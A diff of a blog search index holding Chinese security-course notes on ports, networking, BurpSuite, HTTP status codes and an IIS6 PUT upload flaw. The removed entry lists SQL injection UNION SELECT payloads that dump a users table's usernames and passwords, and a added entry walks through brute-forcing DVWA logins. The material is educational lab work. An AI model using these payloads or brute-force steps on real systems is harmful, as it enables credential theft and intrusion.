@@ -4,11 +4,11 @@
   
     
     <entry>
-      <title>UNION SELECT 命令 SQL注入</title>
-      <link href="/2019/08/14/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/"/>
-      <url>/2019/08/14/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/</url>
+      <title>端口</title>
+      <link href="/2019/08/24/%E7%AB%AF%E5%8F%A3/"/>
+      <url>/2019/08/24/%E7%AB%AF%E5%8F%A3/</url>
       
-        <content type="html"><![CDATA[<h1 id="1、查看当前数据库信息"><a href="#1、查看当前数据库信息" class="headerlink" title="1、查看当前数据库信息"></a>1、查看当前数据库信息</h1><pre><code>and 2=1 union select  database(),version(),user(),4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9</code></pre><p><img src="/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/20190814123551167.png" alt></p><h1 id="2、通过tables表查询相关信息"><a href="#2、通过tables表查询相关信息" class="headerlink" title="2、通过tables表查询相关信息"></a>2、通过tables表查询相关信息</h1><pre><code>and 1=2 union select (select group_concat(table_name,&#39;~&#39;,table_schema,&#39;~&#39;,column_name) from information_schema.columns where table_schema=&#39;content&#39; or table_name=&#39;users&#39; ),2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9</code></pre><p><img src="/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/20190814123637831.png" alt></p><h1 id="3、根据查询信息查看单个表的详细信息"><a href="#3、根据查询信息查看单个表的详细信息" class="headerlink" title="3、根据查询信息查看单个表的详细信息"></a>3、根据查询信息查看单个表的详细信息</h1><h2 id="第一个表"><a href="#第一个表" class="headerlink" title="第一个表"></a>第一个表</h2><pre><code>and 1=2 union select (select group_concat(id,&#39;|&#39;,title,&#39;|&#39;,value,&#39;|&#39;,time,&#39;|&#39;,ip) from test.content),2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9</code></pre><p><img src="/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/20190814123734085.png" alt></p><h2 id="第二个表"><a href="#第二个表" class="headerlink" title="第二个表"></a>第二个表</h2><pre><code>and 1=2 union select (select group_concat(id,&#39;|&#39;,username,&#39;|&#39;,passwd,&#39;|&#39;,user_ip,&#39;|&#39;,join_date) from test.users),2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9</code></pre><p><img src="/UNION-SELECT-%E5%91%BD%E4%BB%A4-SQL%E6%B3%A8%E5%85%A5/20190814123814194.png" alt></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="端口（port）"><a href="#端口（port）" class="headerlink" title="端口（port）"></a>端口（port）</h1><p>设备与外界通讯交流的出口。端口可分为虚拟端口和物理端口。<br>虚拟端口：计算机内部或交换机路由器内的端口，不可见<br>物理端口：可见端口<br>是接口电路中的一些寄存器，这些寄存器分别用来存放数据信息，控制信息和状态信息，相应的端口分别称为数据端口、控制端口、状态端口</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="硬件端口"><a href="#硬件端口" class="headerlink" title="硬件端口"></a>硬件端口</h3><p>CPU通过接口寄存器或特定电路与外设进行数据传送，这些寄存器或特定电路称之为端口</p><h3 id="网络端口"><a href="#网络端口" class="headerlink" title="网络端口"></a>网络端口</h3><p>在网路技术中，端口有好几种意思。集线器、交换机、路由器的端口指的是连接其他网络设备的接口。<br>特指TCP/IP协议中的端口，是逻辑端口</p><h4 id="网络中端口共有-2的16次方（65535个）端口号"><a href="#网络中端口共有-2的16次方（65535个）端口号" class="headerlink" title="网络中端口共有 2的16次方（65535个）端口号"></a>网络中端口共有 2的16次方（65535个）端口号</h4><p>0<del>1023：规则设计这负责<br>0</del>255：公用端口<br>256<del>1023：公司专用<br>1024</del>65535：临时端口</p><h4 id="常用的端口"><a href="#常用的端口" class="headerlink" title="常用的端口"></a>常用的端口</h4><p>8080：中间件（代理服务器的端口）<br>21：FTP<br>22：ssh<br>23：Telnet<br>25：SMTP，用于发送邮件<br>80：HTTP，用于网页浏览<br>102：Message transfer agent(MTA)-X 400 over TCP/IP，消息传输代理<br>110：Post Office Protocol-Version3<br>111：SUN公司的RPC服务所有端口<br>119：Network News Transfer Protocol<br>135：Location Service<br>137、138、139：NETBIOS Name Service<br>161：SNMP<br>177：X Display Managet Control Protocol<br>389：LDAP、ILS</p><h3 id="软件端口"><a href="#软件端口" class="headerlink" title="软件端口"></a>软件端口</h3><p>缓冲区</p><h1 id="端口转发-Port-forwarding"><a href="#端口转发-Port-forwarding" class="headerlink" title="端口转发(Port forwarding)"></a>端口转发(Port forwarding)</h1><p>有时称隧道，是安全壳（SSH）为网络安全通信使用的一种方法。<br>转发一个网络端口从一个网络节点到另一个网络节点的行为，是一个外部用户从外部经过一个被激活的NAT路由器到达一个在私有内部IP地址（局域网内部）上的一个端口。</p><h2 id="端口转发与端口映射"><a href="#端口转发与端口映射" class="headerlink" title="端口转发与端口映射"></a>端口转发与端口映射</h2><table><thead><tr><th>端口转发</th><th>端口映射</th></tr></thead><tbody><tr><td>将一个端口，这个端口可以是本机端口也可以是本机能访问的任意主机的端口可以转发到任意一台可以访问的IP上，通常这个IP是公网IP（方便使用）</td><td>原理核心和端口转发一样，不过是将本机的端口转发到远程的某个端口</td></tr><tr><td><strong>在第三层网络层</strong></td><td></td></tr></tbody></table>]]></content>
       
       
       <categories>
@@ -20,7 +20,262 @@
       
         <tags>
             
+            <tag> 第六周 </tag>
+            
+            <tag> 网络基础 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>网络基础</title>
+      <link href="/2019/08/23/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
+      <url>/2019/08/23/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
+      
+        <content type="html"><![CDATA[<h1 id="常见网络设备"><a href="#常见网络设备" class="headerlink" title="常见网络设备"></a>常见网络设备</h1><h2 id="网卡"><a href="#网卡" class="headerlink" title="网卡"></a>网卡</h2><p>计算机网络上进行通讯的计算机硬件，拥有MAC地址属于OSI第一层物理层</p><h3 id="修改MAC地址：设备管理器-〉网络地址"><a href="#修改MAC地址：设备管理器-〉网络地址" class="headerlink" title="修改MAC地址：设备管理器-〉网络地址"></a>修改MAC地址：设备管理器-〉网络地址</h3><p>cmd中ipconfig查看当前网卡的MAC地址<br><img src="/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/20190823085023494.png" alt><br><img src="/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/20190823084911720.png" alt><br>修改后会自动重载再次查看数值发生变化</p><h2 id="集线器“Hub”"><a href="#集线器“Hub”" class="headerlink" title="集线器“Hub”"></a>集线器“Hub”</h2><p>用于扩大网络传输距离，把所有节点集中到以它为中心的节点上。在OSI第一层。属于纯硬件网络底层设备。不具备“智能记忆”和“学习能力”。<strong>不具有MAC地址表</strong>，发送数据没有针对性，采用广播方式发送。</p><h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><p>用于数据转发的网络设备，工作于OSI模型第二层。是集线器的升级版。具有“智能记忆”和“学习能力”，<strong>使用MAC地址来寻址。</strong>常见的是以太网交换机</p><h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><p>连接两个或多个网络硬件设备，起网关作用。运行在OSI模型第三层，使用IP地址通信，现在交换机基本上都是三层交换机和路由器没有什么区别</p><h1 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h1><h2 id="局域网-LAN"><a href="#局域网-LAN" class="headerlink" title="局域网(LAN)"></a>局域网(LAN)</h2><p>覆盖范围一般是方圆几米之内，具备安装便捷、成本节约、扩展方便的特点。具备网络传输速度快，性能稳定，框架简易，环境封闭。<br>局域网大体上由计算机设备（服务器与工作站）、网络连接设备（网卡、集线器、交换机）、网络传输介质（网线：同轴电缆、双绞线、光缆）3大部分构成。<br>局域网是一种似有网络，被广泛用来连接个人计算机和消费电子设备，使它们能够共享资源和交换信息。</p><h3 id="局域网的分类"><a href="#局域网的分类" class="headerlink" title="局域网的分类"></a>局域网的分类</h3><h4 id="无线局域网（WLAN）"><a href="#无线局域网（WLAN）" class="headerlink" title="无线局域网（WLAN）"></a>无线局域网（WLAN）</h4><p>设备连接接入点（无线路由器/基站），接入点负责中继无线计算之间的数据包，还负责无线计算机和Internet之间的数据包<br>无线局域网一个标准称为IEEE 802.11，俗称WIFI</p><h4 id="有线局域网"><a href="#有线局域网" class="headerlink" title="有线局域网"></a>有线局域网</h4><p>使用各种不同的传输技术，大多使用铜线为传输介质，也使用光纤。和无线局域网相比，有线局域网的性能和稳定性更好。<br>有线局域网的拓扑结构是以点到点链路为基础，点到点链路连接到一个盒子（交换机）。俗称以太网 IEEE 802.3。</p><h3 id="局域网的常见拓扑结构"><a href="#局域网的常见拓扑结构" class="headerlink" title="局域网的常见拓扑结构"></a>局域网的常见拓扑结构</h3><h4 id="星形"><a href="#星形" class="headerlink" title="星形"></a>星形</h4><p>网络中的每一个节点设备都以中心结为中心，通过连接线与中心节点相连。<br>中心节点是控制中心，任意两个节点间的通信最多只需两步，所以传输速度快，网络结构简单、建网容易、便于控制管理。<br>稳定性差，共享能力低，并且中心节点如果出现问题整个网络会全面瘫痪。</p><h4 id="树形"><a href="#树形" class="headerlink" title="树形"></a>树形</h4><p>天然的分级结构，分级的集中式网络。<br>特点：成本低，结构简单。任意两个节点之间不产生回路，每个链路都支持双向传输，网络中节点扩充方便、灵活，巡查链路路径简单。<br>除叶节点及其相连的链路外，任何一个工作站或链路产生故障会影响整个网络的正常运行。</p><h4 id="总线形"><a href="#总线形" class="headerlink" title="总线形"></a>总线形</h4><p>将各个节点设备和一根总线相连。网络中所有节点工作站都是通过总线进行信息传输。<br><img src="/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/20190824011319086.png" alt></p><h4 id="环形"><a href="#环形" class="headerlink" title="环形"></a>环形</h4><p>网络中各个节点通过一条首尾相连的通信链路连接起来的一个闭合环形结构网。<br>系统中各个工作站地位相等。系统中通信设备和线路相对节省。<br>网络中信息设有固定单向流动，两个工作站节点之间仅有一条通路，系统中无信道选择问题。某个节点的故障价格导致物理瘫痪。由于环路封闭，不便于扩充，系统响应延时长，信息传输效率相对较低。</p><h2 id="互联网-WAN"><a href="#互联网-WAN" class="headerlink" title="互联网(WAN)"></a>互联网(WAN)</h2><p>Internet，又称传媒领域。是网络与网络之间串联成的庞大网络。网络之间以通用的协议相连，形成逻辑上的单一巨大国际网络。<br>互联网不同于万维网，万维网只是基于超文本相互链接形成的全球系统，只是互联网提供服务中的一种。</p><h4 id="网络数据的传输"><a href="#网络数据的传输" class="headerlink" title="网络数据的传输"></a>网络数据的传输</h4><p>数据在计算机之间传输，需要两个前提：<br>1。数据传输的地址（IP）<br>2。保证数据有效传输的协议（TCP）<br>TCP/IP协议：采用的是分组交换方式。在传输中分成若干段，每个数据段称为一个数据包。<br>TCP/IP协议主要包括两个协议：TCP协议和IP协议</p><h4 id="互联网、因特网、万维网"><a href="#互联网、因特网、万维网" class="headerlink" title="互联网、因特网、万维网"></a>互联网、因特网、万维网</h4><p>互联网包含因特网，因特网包含万维网，凡是能彼此通信的设备组成的网络就叫互联网。<br>因特网是基于TCP/IP协议实现的，TCP/IP协议由很多协议组成，不同协议被放在不同的层。</p><h1 id="OSI网络分层"><a href="#OSI网络分层" class="headerlink" title="OSI网络分层"></a>OSI网络分层</h1><p>OSI（Open System Interconnection）开放式系统互联。一共分七层，定义不同计算机互联标准是设计和描述计算机通信的基本框架。现常使用五层模型结构，将应用层、表示层、会话层统称第五层应用层。<br><img src="/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/20190824013633881.png" alt><br><em>小知识：高锟，光纤之父中国人</em></p><h2 id="常见的网络协议和所在的网络层"><a href="#常见的网络协议和所在的网络层" class="headerlink" title="常见的网络协议和所在的网络层"></a>常见的网络协议和所在的网络层</h2><p><img src="/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/20190824013819283.png" alt><br>网络协议：计算机网络中互相通信的对等实体之间交换信息时必须遵守的规则的集合。<br><img src="/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/20190824022048342.png" alt></p><h3 id="网络协议的三个组成要素"><a href="#网络协议的三个组成要素" class="headerlink" title="网络协议的三个组成要素"></a>网络协议的三个组成要素</h3><p>1。语义：解释控制信息每个部分的意义。<br>2。语法：用户数据与控制信息的结构与格式，以及数据出现的顺序。<br>3。时序：对事件发生顺序的详细说明。</p><h3 id="网络协议"><a href="#网络协议" class="headerlink" title="网络协议"></a>网络协议</h3><p>网络协议是网络上所有设备（网络服务器、计算机及交换机、路由器、防火墙等）之间通信规则的集合，规定了通信是信息必须采用的格式和这些格式的意义。<br>大多数网络采用的是分层体系结构，每一层都建立在它的下层之上，向它的上一层提供一定的服务。在网络中各层中存在着许多协议，接收方和发送放同层的协议必须一致，否则无法进行有效通信。<br>常见的协议：TCP/IP协议、IPX/SPX协议、NetBEUI协议等</p><h3 id="层次结构"><a href="#层次结构" class="headerlink" title="层次结构"></a>层次结构</h3><p>1。结构中的每一层都规定有明确的服务及接口标准<br>2。把用户的应用程序作为最高层<br>3。除了最高层，中间的每一层都向上一层提供服务，同时又是下一层的用户<br>4。物理通信线路作为最底层，使用从最高层传送来的参数。是提供服务的基础</p><h2 id="常见的协议（这里使用的是五层OSI模型）"><a href="#常见的协议（这里使用的是五层OSI模型）" class="headerlink" title="常见的协议（这里使用的是五层OSI模型）"></a>常见的协议（这里使用的是五层OSI模型）</h2><h3 id="PPTP（Point-to-Point-Tunneling-Protocol）"><a href="#PPTP（Point-to-Point-Tunneling-Protocol）" class="headerlink" title="PPTP（Point to Point Tunneling Protocol）"></a>PPTP（Point to Point Tunneling Protocol）</h3><p>点对点隧道协议，支持多协议虚拟专用网络（VPN），可以通过密码验证协议（PAP），可扩展认证协议（EAP）等方法增强安全性<br><strong>默认端口号：1723</strong><br><strong>第二层协议</strong></p><h3 id="L2TP（Layer-Two-Tunneling-Protocol）"><a href="#L2TP（Layer-Two-Tunneling-Protocol）" class="headerlink" title="L2TP（Layer Two Tunneling Protocol）"></a>L2TP（Layer Two Tunneling Protocol）</h3><p>一种虚拟隧道协议，虚拟网络专用。L2TP协议自身不提供加密与可靠性验证功能，可以和安全协议（IPsec）搭配使用。实现数据的加密传输。<br><strong>默认端口号：使用UDP注册端口 1701</strong><br><strong>第二层协议</strong></p><h4 id="PPTP与L2TP区别"><a href="#PPTP与L2TP区别" class="headerlink" title="PPTP与L2TP区别"></a>PPTP与L2TP区别</h4><table><thead><tr><th>PPTP</th><th>L2TP</th></tr></thead><tbody><tr><td>要求互联网为IP网络</td><td>之要求隧道媒介提供面向数据包的点对点连接</td></tr><tr><td>只能在两端点之间建立单一隧道</td><td>支持在两端点之间使用多隧道</td></tr><tr><td>压缩包头，系统开销占用6字节</td><td>压缩包头，系统开销占用4字节</td></tr><tr><td>提供隧道认证</td><td>不提供隧道认证，L2TP和IPsec共同使用时可有IPsec提供隧道认证</td></tr><tr><td>### Socks5 代理</td><td></td></tr><tr><td>只是简单的传递数据包，不关心是和种应用协议。为客户端到服务端之间的数据进行联系，提供安全服务。对TCP/IP的高级协议加以管制。Eg：Telnet、FTP、HTTP、SMTP等</td><td></td></tr><tr><td><strong>默认端口：1080</strong></td><td></td></tr><tr><td><strong>第五层协议</strong></td><td></td></tr><tr><td>### HTTP协议</td><td></td></tr><tr><td>超文本传输协议。HTTP代理，代理客户机的HTTP访问，主要代理浏览器访问网页。</td><td></td></tr><tr><td><strong>默认端口：80、8080、3128等</strong></td><td></td></tr><tr><td>#### Socks和HTTP区别</td><td></td></tr><tr><td>Socks</td><td>HTTP</td></tr><tr><td>-</td><td>-</td></tr><tr><td>只是简单的传递数据包，不关心是何种应用协议</td><td>工作在应用层</td></tr><tr><td>Socks4：只支持TCP协议</td><td></td></tr><tr><td>Socks5：支持TCP、UDP、身份验证、服务器端口域名解析等</td><td></td></tr><tr><td>### ICMP协议</td><td></td></tr><tr><td>面向无连接的协议，用于传输错误报告控制信息，主要用于主机与路由器之间传递控制信息，错误报告，交换受限控制和状态信息等。和IP协议、ARP协议、RARP协议、IGMP共同构成TCP/IP模型中的网络层。</td><td></td></tr><tr><td><strong>第三层协议</strong></td><td></td></tr><tr><td>#### Ping（Packet Internet Groper）</td><td></td></tr><tr><td>Ping是TCP/IP协议的一部分，检测网络是否畅通。发送一个ICMP（Internet Control Messages Protocol）因特信报控制协议，回声请求消息给目的地并报告是否受到锁心往的ICMPecho（ICMP回声应答）</td><td></td></tr></tbody></table>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 第六周 </tag>
+            
+            <tag> 网络基础 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>BurpSuite使用简介</title>
+      <link href="/2019/08/23/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/"/>
+      <url>/2019/08/23/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/</url>
+      
+        <content type="html"><![CDATA[<p>以火狐为例<br>1。设置代理<br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823081533269.png" alt><br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823081538189.png" alt><br>2。设置BurpSuite，端口和浏览器一致<br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823081627457.png" alt><br>如果抓包后不能上网，显示证书问题，就下载证书安装<br>登陆127.0.0.1：8080这个是浏览器的设置<br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823083603385.png" alt><br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823083441584.png" alt><br>3。使用<br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823081636168.png" alt><br>4。爬虫<br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823081657190.png" alt><br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823081701952.png" alt><br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823081718863.png" alt><br>5。便捷修改数据包的传输方式<br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823081752742.png" alt><br>6。关于插件问题<br>有些插件需要安装jpython，在插件配置进行设置<br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823083903854.png" alt><br>一些插件可以从商店下载，但大部分精华需要自己根据需要编写插件。语言使用java或jpython<br>7。项目保存<br><img src="/BurpSuite%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B/20190823084133751.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+          <category> 工具 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+            <tag> 第六周 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>BurpSuite爆破模块</title>
+      <link href="/2019/08/23/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/"/>
+      <url>/2019/08/23/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/</url>
+      
+        <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>1。目标是搭建的DVWA<br>2。工具使用BurpSuite,火狐（设置代理配置）</p><h1 id="BurpSuite的爆破模式"><a href="#BurpSuite的爆破模式" class="headerlink" title="BurpSuite的爆破模式"></a>BurpSuite的爆破模式</h1><table><thead><tr><th>模式</th><th>特点</th></tr></thead><tbody><tr><td>Sniper(阻击手)</td><td>只能设置一个Payload，一个一个进行尝试<br>如果设置两个，就一个执行另一个不执行</td></tr><tr><td>Battering ram（攻城锤）</td><td>只能设置一个Payload，和阻击手差不多<br>如果设置两个，就同步爆破</td></tr><tr><td>Pitchfork（草叉）</td><td>随着设置的变量个数确定Payload，按照顺序一一对应尝试破解<br>123；456   1-4  2-5  3-6</td></tr><tr><td>Cluster bomb（集束炸弹）</td><td>笛卡尔积，排列组合尝试破解</td></tr><tr><td># 从DVWA的low级开始爆破</td><td></td></tr><tr><td>1。登陆抓包</td><td></td></tr><tr><td>2。对抓包数据分析，发送到Repeater进行修改验证</td><td></td></tr><tr><td><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823075356299.png" alt></td><td></td></tr><tr><td>3。可以修改发送到Intruder进行爆破</td><td></td></tr><tr><td>4。选择爆破模式</td><td></td></tr><tr><td><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080129394.png" alt></td><td></td></tr><tr><td>5。根据爆破信息查找密码</td><td></td></tr><tr><td><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080158571.png" alt></td><td></td></tr><tr><td>```</td><td></td></tr><tr><td>正常登陆成功或失败会有跳转，3xx开头的状态码值得关注</td><td></td></tr><tr><td>length报文的长度寻找最独特的，大概率会找到</td><td></td></tr><tr><td>如果破解带有token的报文需要对token进行随机数处理。因为token在进行一次登陆验证后就会失效。</td><td></td></tr><tr><td>```</td><td></td></tr><tr><td>6。报文变量的设置</td><td></td></tr><tr><td><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080514148.png" alt></td><td></td></tr><tr><td>7。爆破密码的窗口</td><td></td></tr><tr><td><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080528590.png" alt></td><td></td></tr><tr><td># DVWA的high等级的爆破尝试</td><td></td></tr><tr><td>因为DVWA的high等级登陆包含token所以对爆破进行相关设置</td><td></td></tr><tr><td>1。选择草叉模式</td><td></td></tr><tr><td><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080734033.png" alt></td><td></td></tr><tr><td>2。设置一个线程</td><td></td></tr><tr><td><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080752983.png" alt></td><td></td></tr><tr><td>3。设置Payload、枚举随机数和token的设置</td><td></td></tr><tr><td><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080808293.png" alt></td><td></td></tr><tr><td><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080829581.png" alt></td><td></td></tr><tr><td><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080849673.png" alt></td><td></td></tr><tr><td>4。进行爆破效果</td><td></td></tr><tr><td><img src="/BurpSuite%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97/20190823080913451.png" alt></td><td></td></tr></tbody></table>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+          <category> 工具 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+            <tag> 第六周 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ii6 put文件上传漏洞</title>
+      <link href="/2019/08/23/ii6-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2019/08/23/ii6-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h1 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h1><p>1。自己搭建网站，使用winserver2003<br>2。给网站相关权限<br>3。BurpSuite抓包分析</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="尝试的ii7-put"><a href="#尝试的ii7-put" class="headerlink" title="尝试的ii7 put"></a>尝试的ii7 put</h2><p>1。使用OPTIONS获取网站的相关信息<br><img src="/ii6-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/20190823074329520.png" alt><br>2。尝试写入文件<br><img src="/ii6-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/20190823074411531.png" alt><br>写入失败，尝试Burp抓包查看</p><p>将ii7更换ii6再次尝试<br>使用Netcat获取网站信息<br><img src="/ii6-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/20190823074710221.png" alt><br>BurpSuite抓包，OPTIONS获取网站信息<br><img src="/ii6-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/20190823074518565.png" alt><br>尝试put写入<br><img src="/ii6-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/20190823074630072.png" alt><br>成功写入<br><img src="/ii6-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/20190823074645105.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+          <category> 漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞 </tag>
+            
+            <tag> 第六周 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>HTTP协议的状态码</title>
+      <link href="/2019/08/23/HTTP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%8A%B6%E6%80%81%E7%A0%81/"/>
+      <url>/2019/08/23/HTTP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%8A%B6%E6%80%81%E7%A0%81/</url>
+      
+        <content type="html"><![CDATA[<h1 id="状态码分类"><a href="#状态码分类" class="headerlink" title="状态码分类"></a>状态码分类</h1><h2 id="1-5百系列的大致含义"><a href="#1-5百系列的大致含义" class="headerlink" title="1~5百系列的大致含义"></a>1~5百系列的大致含义</h2><p>1xx：提示信息——表示请求以接受，继续处理<br>2xx：成功——请求已被成功接收、解析、接受<br>3xx：重定向——要完成请求必须进行更进一步的操作<br>4xx：客户端错误——请求错误或无法实现<br>5xx：服务端错误——服务器未能实现请求</p><h2 id="常见的状态码"><a href="#常见的状态码" class="headerlink" title="常见的状态码"></a>常见的状态码</h2><p>注释：常见状态码：</p><table><thead><tr><th>状态码</th><th>含义</th></tr></thead><tbody><tr><td>200 OK</td><td>客户端请求成功</td></tr><tr><td>400 Bad Request</td><td>客户端请求有语法错误，不能被服务器所理解</td></tr><tr><td>401 Unauthorized</td><td>请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用</td></tr><tr><td>403 Forbidden</td><td>服务器收到请求，但是拒绝提供服务</td></tr><tr><td>404 Not Found</td><td>请求资源不存在，eg：输入了错误的URL</td></tr><tr><td>500 Internal Server Error</td><td>服务器发生不可预期的错误</td></tr><tr><td>503 Server Unavailable</td><td>服务器当前不能处理客户端的请求，一段时间后可能恢复正常</td></tr></tbody></table>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 第六周 </tag>
+            
+            <tag> HTTP协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>URI、URL、URN</title>
+      <link href="/2019/08/23/URI%E3%80%81URL%E3%80%81URN/"/>
+      <url>/2019/08/23/URI%E3%80%81URL%E3%80%81URN/</url>
+      
+        <content type="html"><![CDATA[<h1 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h1><p>URL统一资源定位符，是Internet上资源的地址，可以定义为引用地址的字符串，用于指定资源的位置以及用于访问他的协议。<br>URL网络上定位资源最普遍的使用方式，提供了一种通过描述网络位置或主要访问机制来检索物理位置的方法。</p><h2 id="URL包含信息"><a href="#URL包含信息" class="headerlink" title="URL包含信息"></a>URL包含信息</h2><p>1。访问资源的协议<br>2。服务器的位置（IP或域名）<br>3。服务器端口（可选）<br>4。资源在服务器目录结构中的位置<br>5。锚</p><h1 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h1><p>URI（Univeral Resource Identifier）：统一资源标识符，标识逻辑或物理资源的字符序列，与URL类似，也是一串字符串，通常使用位置、名称或两者标识Internet上的资源；允许统一识别资源。</p><h2 id="URI有两种类型：URL（统一资源标识符）、URN-统一资源名称"><a href="#URI有两种类型：URL（统一资源标识符）、URN-统一资源名称" class="headerlink" title="URI有两种类型：URL（统一资源标识符）、URN(统一资源名称)"></a>URI有两种类型：URL（统一资源标识符）、URN(统一资源名称)</h2><p>任何URI的通用形式都是：</p><pre><code>scheme:[// [user:password @] host [:port]] [/] path [? 查询] [#锚]scheme： 